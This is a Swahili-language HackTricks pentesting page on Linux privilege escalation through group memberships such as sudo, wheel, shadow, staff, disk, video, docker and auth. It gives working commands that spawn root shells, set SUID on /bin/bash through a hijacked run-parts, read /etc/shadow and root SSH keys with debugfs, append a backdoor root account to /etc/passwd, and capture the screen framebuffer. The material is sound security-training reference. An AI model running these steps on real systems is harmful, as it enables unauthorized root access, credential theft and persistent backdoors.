# Interesting Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groups

### **PE - Method 1**

**Wakati mwingine**, **kwa kawaida (au kwa sababu programu fulani inahitaji hivyo)** ndani ya **/etc/sudoers** faili unaweza kupata baadhi ya mistari hii:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Hii inamaanisha kwamba **mtumiaji yeyote anaye belong kwenye kundi la sudo au admin anaweza kutekeleza chochote kama sudo**.

Ikiwa hii ni hali, ili **kuwa root unaweza tu kutekeleza**:
```
sudo su
```
### PE - Method 2

Pata binaries zote za suid na angalia kama kuna binary **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Ikiwa utagundua kwamba binary **pkexec ni binary ya SUID** na unategemea **sudo** au **admin**, huenda unaweza kutekeleza binaries kama sudo ukitumia `pkexec`.\
Hii ni kwa sababu kawaida hizo ndizo vikundi ndani ya **polkit policy**. Sera hii kimsingi inatambua ni vikundi vipi vinaweza kutumia `pkexec`. Angalia kwa:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Hapo utapata ni vikundi vipi vinavyoruhusiwa kutekeleza **pkexec** na **kwa kawaida** katika baadhi ya disktros za linux vikundi **sudo** na **admin** vinajitokeza.

Ili **kuwa root unaweza kutekeleza**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Ikiwa unajaribu kutekeleza **pkexec** na unapata **error** hii:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Sio kwa sababu huna ruhusa bali kwa sababu haujaunganishwa bila GUI**. Na kuna suluhisho la tatizo hili hapa: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **sessions 2 tofauti za ssh**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**Wakati mwingine**, **kwa kawaida** ndani ya faili **/etc/sudoers** unaweza kupata mstari huu:
```
%wheel	ALL=(ALL:ALL) ALL
```
Hii inamaanisha kwamba **mtumiaji yeyote anaye belong kwenye kundi la wheel anaweza kutekeleza chochote kama sudo**.

Ikiwa hii ni hali, ili **kuwa root unaweza tu kutekeleza**:
```
sudo su
```
## Shadow Group

Watumiaji kutoka **group shadow** wanaweza **kusoma** faili ya **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, read the file and try to **crack some hashes**.

## Staff Group

**staff**: Inaruhusu watumiaji kuongeza mabadiliko ya ndani kwenye mfumo (`/usr/local`) bila kuhitaji ruhusa za mzizi (zingatia kwamba executable katika `/usr/local/bin` ziko kwenye mabadiliko ya PATH ya mtumiaji yeyote, na zinaweza "kufunika" executable katika `/bin` na `/usr/bin` zenye jina sawa). Linganisha na kundi "adm", ambalo lina uhusiano zaidi na ufuatiliaji/usalama. [\[source\]](https://wiki.debian.org/SystemGroups)

Katika usambazaji wa debian, mabadiliko ya `$PATH` yanaonyesha kwamba `/usr/local/` itatekelezwa kama kipaumbele cha juu zaidi, iwe wewe ni mtumiaji mwenye ruhusa au la.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Ikiwa tunaweza kuhamasisha programu fulani katika `/usr/local`, tunaweza kwa urahisi kupata root.

Kuhamasisha programu ya `run-parts` ni njia rahisi ya kupata root, kwa sababu programu nyingi zitakimbia `run-parts` kama (crontab, wakati wa kuingia ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
au Wakati wa kuingia kwa kikao kipya cha ssh.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Hii haki ni karibu **sawa na ufikiaji wa root** kwani unaweza kufikia data zote ndani ya mashine.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Kumbuka kwamba ukitumia debugfs unaweza pia **kuandika faili**. Kwa mfano, ili nakala ya `/tmp/asd1.txt` kwenda `/tmp/asd2.txt` unaweza kufanya:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Hata hivyo, ikiwa unajaribu **kuandika faili zinazomilikiwa na root** (kama `/etc/shadow` au `/etc/passwd`) utapata kosa la "**Permission denied**".

## Video Group

Kwa kutumia amri `w` unaweza kupata **nani aliyeingia kwenye mfumo** na itatoa matokeo kama ifuatavyo:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** inamaanisha kwamba mtumiaji **yossi amejiandikisha kimwili** kwenye terminal kwenye mashine.

Kikundi cha **video** kina ufikiaji wa kuangalia matokeo ya skrini. Kimsingi unaweza kuangalia skrini. Ili kufanya hivyo unahitaji **kuchukua picha ya sasa kwenye skrini** katika data safi na kupata azimio ambalo skrini inatumia. Data ya skrini inaweza kuhifadhiwa katika `/dev/fb0` na unaweza kupata azimio la skrini hii kwenye `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Ili **kufungua** **picha ya raw** unaweza kutumia **GIMP**, chagua faili ya \*\*`screen.raw` \*\* na chagua kama aina ya faili **Raw image data**:

![](<../../../images/image (463).png>)

Kisha badilisha Upana na Kimo kuwa zile zinazotumika kwenye skrini na angalia Aina tofauti za Picha (na uchague ile inayoonyesha vizuri skrini):

![](<../../../images/image (317).png>)

## Kundi la Root

Inaonekana kwamba kwa kawaida **wanachama wa kundi la root** wanaweza kuwa na ufikiaji wa **kubadilisha** baadhi ya **faili za usanidi** wa **huduma** au baadhi ya **faili za maktaba** au **mambo mengine ya kuvutia** ambayo yanaweza kutumika kuongeza mamlaka...

**Angalia ni faili zipi wanachama wa root wanaweza kubadilisha**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Unaweza **kushikilia mfumo wa faili wa mzazi wa mashine kwenye kiasi cha mfano**, hivyo wakati mfano unapoanza inapoanza mara moja inachukua `chroot` kwenye kiasi hicho. Hii kwa ufanisi inakupa root kwenye mashine.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Hatimaye, ikiwa hupendi yoyote ya mapendekezo ya awali, au hayafanyi kazi kwa sababu fulani (docker api firewall?) unaweza kila wakati kujaribu **kufanya kazi kwenye kontena lenye mamlaka na kutoroka kutoka kwake** kama ilivyoelezwa hapa:

{{#ref}}
../docker-security/
{{#endref}}

Ikiwa una ruhusa za kuandika juu ya socket ya docker soma [**hii chapisho kuhusu jinsi ya kupandisha mamlaka kwa kutumia socket ya docker**](../index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Kundi la lxc/lxd

{{#ref}}
./
{{#endref}}

## Kundi la Adm

Kwa kawaida **wanachama** wa kundi **`adm`** wana ruhusa za **kusoma** faili za log zilizopo ndani ya _/var/log/_.\
Hivyo, ikiwa umepata mtumiaji ndani ya kundi hili unapaswa kwa hakika kuangalia **logi**.

## Kundi la Auth

Ndani ya OpenBSD kundi la **auth** kwa kawaida linaweza kuandika katika folda _**/etc/skey**_ na _**/var/db/yubikey**_ ikiwa zinatumika.\
Ruhusa hizi zinaweza kutumika vibaya kwa kutumia exploit ifuatayo ili **kupandisha mamlaka** hadi root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
